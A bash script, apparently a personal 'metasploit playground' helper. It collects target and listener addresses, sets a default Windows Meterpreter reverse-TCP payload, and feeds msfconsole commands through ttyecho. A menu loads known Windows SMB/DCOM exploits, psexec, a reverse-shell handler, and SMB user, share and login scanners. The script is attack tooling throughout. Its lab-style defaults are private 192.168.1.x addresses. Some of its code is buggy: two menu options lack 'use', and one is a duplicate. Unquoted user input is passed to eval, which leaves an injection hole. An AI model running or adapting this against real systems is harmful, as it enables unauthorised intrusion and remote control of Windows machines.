#!/bin/bash
# metasploit playground
# Bold White: 	\e[1;37m 
# Bold Red :	\e[1;31m
# Bold Green:	\e[1;32m

# set up
initz ()
{

	Blk='\e[1;30m'       # Black
	Red='\e[1;31m'         # Red
	Green='\e[1;32m'       # Green
	Yellow='\e[1;33m'      # Yellow
	Blue='\e[1;34m'        # Blue
	Purple='\e[1;35m'      # Purple
	Cyan='\e[1;36m'        # Cyan
	White='\e[1;37m'       # White
	BYellow='\e[43m'
	BBlack='\e[40m'
}
setup()
{
	clear
	# show pts of msfconsole
	cli="$(ps aux | grep msfconsole)"
	echo
	echo $cli
	echo
	echo -e "${White} enter pts # of msfconsole ${Purple}"
	read ppts
	ppts="/dev/pts/"$ppts
	echo  $ppts


	echo
	echo -e "${White}Enter Workspace ${Purple}"
	read wspace
	if [ -z $wspace ]; then
		wspace="default"
	    fi
	echo -e "${White}Enter global RHOST (192.168.1.100) ${Purple}"
	read RHOST
	if [ -z $RHOST ]; then
		RHOST="192.168.1.100"
		fi
	echo -e "${White}Enter global RHOSTS (192.168.1.0/24) ${Purple}"
	read RHOSTS
	if [ -z $RHOSTS ]; then
		RHOSTS="192.168.1.0/24"
	   	fi
	echo -e "${White}Enter global LHOST (192.168.1.233) ${Purple}"
	read LHOST
	if [ -z $LHOST ]; then
		LHOST="192.168.1.233"
	    fi
	echo -e "${White}Enter global LPORT (4433) ${Purple}"
	read LPORT
	if [ -z $LPORT ]; then
		LPORT="4433"
	    fi

	echo -e "${White}Enter global payload (windows/meterpreter/reverse_tcp) ${Purple}"
	read payload
	if [ -z $payload ]; then
		payload="windows/meterpreter/reverse_tcp"
		fi
	echo
	echo -e "${White} -------------${Red}-------------${White}-------------"
	echo
	#cli="ttyecho -n /dev/pts/2 show options"
	cli="ttyecho -n ${ppts} workspace -a ${wspace}"
	eval $cli
	cli="ttyecho -n ${ppts} setg RHOST ${RHOST}"
	eval $cli
	cli="ttyecho -n ${ppts} setg RHOSTS ${RHOSTS}"
	eval $cli
	cli="ttyecho -n ${ppts} setg LHOST ${LHOST}"
	eval $cli
	cli="ttyecho -n ${ppts} setg LPORT ${LPORT}"
	eval $cli
	cli="ttyecho -n ${ppts} setg PAYLOAD ${payload}"
	eval $cli
}


#   main Menu
mainmenu ()
{
	clear
	echo -e "${BYellow} ${Red}                    Meta Play Ground                       ${BBlack}"
	echo -e "${White} RHOST: ${Red}" $RHOST "\t \${White} RHOSTS: ${Green}" $RHOSTS
	echo -e "${White} LHOST: ${Red}" $LHOST " ${White} \t LPORT: ${Red}" $LPORT
	echo -e "${White} Payload: ${Red}" $payload "\t  ${White} Workspace:${Red}" $wspace
	echo -e "${White} -------------${Cyan}-------------${White}-------------"
	echo " 1...MS08_67"
	echo " 2...MS03_026_dcom"
	echo " 3...MS10_061_spoolss"
	echo " 4...smb_lookupsid"
	echo " 5...MS10_015_kitrap0d"
	echo " 6.../multi/handler"
	echo " 7...Workspace"
	echo " 8...SMB Enumerate Shares"
	echo " 9...SMB Enumerate Users"
	echo "10...SMB_enumusers_domain"
	echo "11...PSEXEC"
	echo "12...SMB Login"
	echo -e "${White} -------------${Cyan}-------------${White}-------------"
	echo " 0...ReRun setup"

	echo "  Choice: "
	read pick
	if [ $pick = 1 ]; then
		inject="use exploit/windows/smb/ms08_067_netapi"
	fi
	if [ $pick = 2 ]; then
		inject="use exploit/windows/dcerpc/ms03_026_dcom"
	fi
	if [ $pick = 3 ]; then
		inject="use exploit/windows/smb/ms10_061_spoolss"
	fi
	if [ $pick = 4 ]; then
		inject="use auxiliary/scanner/smb/smb_lookupsid"
	fi
	if [ $pick = 5 ]; then
		inject="use exploit/windows/local/ms10_015_kitrap0d"
	fi
	if [ $pick = 6 ]; then
		inject="use exploit/multi/handler"
	fi
	if [ $pick = 7 ]; then
		echo
		echo -e "Enter new workspace"
		read wspace
		inject="workspace -a ${wspace}"
	fi

	if [ $pick = 8 ]; then
		inject="use auxiliary/scanner/smb/smb_enumshares"
	fi
	if [ $pick = 9 ]; then
		inject="auxiliary/scanner/smb/smb_enumusers"
	fi	
	if [ $pick = 10 ]; then
		inject="auxiliary/scanner/smb/smb_enumusers"
	fi
	if [ $pick = 11 ]; then
		inject="use exploit/windows/smb/psexec"
	fi
	if [ $pick = 12 ]; then
		inject="use auxiliary/scanner/smb/smb_login"
	fi



	if [ $pick = 0 ]; then
		setup
		mainmenu
	fi	

	cli="ttyecho -n ${ppts} ${inject}"
	eval $cli
	cli="ttyecho -n ${ppts} show options"
	eval $cli
	#cli="ttyecho ${ppts} exploit"
	#eval $cli
}
# ---------------------------------------------
#  Main Loop
# ---------------------------------------------

initz
setup
while [ 1 ]
do
mainmenu
done

